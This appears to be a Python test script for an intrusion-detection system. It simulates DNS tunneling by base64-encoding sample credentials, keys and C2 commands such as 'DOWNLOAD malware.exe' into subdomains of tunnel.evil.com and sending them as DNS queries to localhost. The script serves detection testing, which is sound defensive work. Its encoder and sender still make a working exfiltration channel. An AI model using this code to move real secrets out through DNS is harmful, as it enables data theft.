#!/usr/bin/env python3
"""
Advanced DNS Tunneling Test - generates traffic that should be detected as DNS tunneling
"""

import socket
import struct
import time
import base64
import random
import string
import threading

class DNSTunnelingSimulator:
    def __init__(self, target_domain="tunnel.evil.com"):
        self.target_domain = target_domain
        # Use loopback by default so the sniffer on NPF_Loopback can capture it.
        # If you switch your sniffer to a real network interface, you can set this to 8.8.8.8.
        self.dns_server = "127.0.0.1"
        
    def encode_data_to_subdomain(self, data, chunk_size=30):
        """Encode data as base64 and split into subdomain chunks"""
        encoded = base64.b64encode(data.encode()).decode()
        chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
        return chunks
    
    def send_dns_query(self, subdomain):
        """Send a DNS query for the given subdomain"""
        try:
            # Create DNS query
            query_domain = f"{subdomain}.{self.target_domain}"

            # Build a minimal valid DNS query (UDP) so the sniffer can decode DNS layers.
            # Header: [ID][FLAGS][QDCOUNT][ANCOUNT][NSCOUNT][ARCOUNT]
            dns_id = random.randint(0, 65535)
            flags = 0x0100  # standard query, recursion desired
            qdcount = 1
            header = struct.pack("!HHHHHH", dns_id, flags, qdcount, 0, 0, 0)

            # Question: QNAME (labels) + QTYPE + QCLASS
            qname = b"".join(
                bytes([len(label)]) + label.encode("ascii", errors="ignore")
                for label in query_domain.strip(".").split(".")
                if label
            ) + b"\x00"
            qtype = 1   # A
            qclass = 1  # IN
            question = qname + struct.pack("!HH", qtype, qclass)
            payload = header + question

            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(payload, (self.dns_server, 53))
            sock.close()
            
            print(f"[+] DNS query sent: {query_domain[:50]}...")
            return True
            
        except Exception as e:
            print(f"[-] Error sending DNS query: {e}")
            return False
    
    def simulate_data_exfiltration(self, data_chunks=30):
        """Simulate exfiltrating data through DNS queries"""
        print(f"[*] Starting DNS tunneling simulation to {self.target_domain}")
        print("[*] Simulating data exfiltration...")
        
        # Sample data to exfiltrate
        sample_data = [
            "user_credentials=admin:password123",
            "database_connection=192.168.1.100:3306", 
            "api_key=sk-1234567890abcdef",
            "sensitive_data=confidential_document.pdf",
            "internal_ip=10.0.0.50",
            "ssh_key=ssh-rsa AAAAB3NzaC1yc2E...",
            "config_file=/etc/secret.conf",
            "user_list=user1,user2,user3",
            "financial_data=account_balance:$50,000",
            "source_code=export DATABASE_URL=postgres://..."
        ]
        
        for i in range(data_chunks):
            # Select random data chunk and add sequence
            data = random.choice(sample_data) + f"_seq_{i}"
            
            # Encode and split into subdomains
            chunks = self.encode_data_to_subdomain(data)
            
            # Send each chunk as separate DNS query
            for chunk in chunks:
                self.send_dns_query(chunk)
                time.sleep(0.1)  # Small delay between queries
            
            # Progress indicator
            if (i + 1) % 5 == 0:
                print(f"[*] Exfiltrated {i + 1}/{data_chunks} chunks")
            
            time.sleep(0.5)  # Delay between data chunks
    
    def simulate_command_and_control(self, commands=20):
        """Simulate C2 communication through DNS"""
        print(f"[*] Simulating C2 communication through DNS...")
        
        # Sample C2 commands
        c2_commands = [
            "GET /commands",
            "POST /heartbeat", 
            "DOWNLOAD malware.exe",
            "EXEC powershell -enc ...",
            "UPLOAD stolen_data.zip",
            "SCAN network 192.168.1.0/24",
            "INJECT process explorer.exe",
            "ENCRYPT files /documents",
            "DELETE logs /var/log",
            "PERSISTENCE registry HKLM\\Software\\..."
        ]
        
        for i in range(commands):
            command = random.choice(c2_commands)
            encoded_command = base64.b64encode(command.encode()).decode()
            
            # Create high-entropy subdomain (common in DNS tunneling)
            subdomain = f"cmd{i}_{encoded_command[:20]}"
            
            self.send_dns_query(subdomain)
            time.sleep(0.2)
            
            if (i + 1) % 5 == 0:
                print(f"[*] Sent {i + 1}/{commands} C2 commands")
    
    def simulate_high_entropy_queries(self, queries=50):
        """Generate high-entropy DNS queries that should trigger detection"""
        print(f"[*] Generating {queries} high-entropy DNS queries...")
        
        for i in range(queries):
            # Generate random high-entropy subdomain
            entropy_length = random.randint(20, 50)
            random_subdomain = ''.join(random.choices(
                string.ascii_letters + string.digits, 
                k=entropy_length
            ))
            
            self.send_dns_query(random_subdomain)
            time.sleep(0.1)
            
            if (i + 1) % 10 == 0:
                print(f"[*] Sent {i + 1}/{queries} entropy queries")
    
    def simulate_hex_encoded_queries(self, queries=30):
        """Generate hex-encoded DNS queries"""
        print(f"[*] Generating {queries} hex-encoded DNS queries...")
        
        for i in range(queries):
            # Generate random hex string
            hex_length = random.randint(16, 32)
            hex_string = ''.join(random.choices('0123456789ABCDEF', k=hex_length))
            
            self.send_dns_query(hex_string)
            time.sleep(0.15)
            
            if (i + 1) % 10 == 0:
                print(f"[*] Sent {i + 1}/{queries} hex queries")

def main():
    print("=== Advanced DNS Tunneling Attack Simulation ===")
    print("This test generates DNS traffic patterns that should be detected as tunneling")
    print()
    
    simulator = DNSTunnelingSimulator()
    
    while True:
        print("Select attack simulation:")
        print("1. Data Exfiltration (30 chunks) - SHOULD trigger DNS tunneling detection")
        print("2. Command & Control (20 commands) - SHOULD trigger DNS tunneling detection")
        print("3. High Entropy Queries (50 queries) - SHOULD trigger DNS tunneling detection")
        print("4. Hex Encoded Queries (30 queries) - SHOULD trigger DNS tunneling detection")
        print("5. All Attacks (full simulation)")
        print("6. Exit")
        
        choice = input("\nEnter choice (1-6): ")
        
        try:
            if choice == "1":
                simulator.simulate_data_exfiltration()
            elif choice == "2":
                simulator.simulate_command_and_control()
            elif choice == "3":
                simulator.simulate_high_entropy_queries()
            elif choice == "4":
                simulator.simulate_hex_encoded_queries()
            elif choice == "5":
                print("[*] Running full DNS tunneling simulation...")
                simulator.simulate_data_exfiltration(10)
                time.sleep(1)
                simulator.simulate_command_and_control(10)
                time.sleep(1)
                simulator.simulate_high_entropy_queries(25)
                time.sleep(1)
                simulator.simulate_hex_encoded_queries(15)
            elif choice == "6":
                break
            else:
                print("Invalid choice")
                continue
            
            print("\n[*] DNS tunneling simulation complete!")
            print("[*] Check your IDS dashboard for DNS tunneling alerts")
            print("[*] Look for: high confidence, malicious status, DNS tunneling detection")
            time.sleep(2)
            
        except KeyboardInterrupt:
            print("\n[*] Simulation interrupted")
            break
        except Exception as e:
            print(f"[!] Error: {e}")

if __name__ == "__main__":
    main()
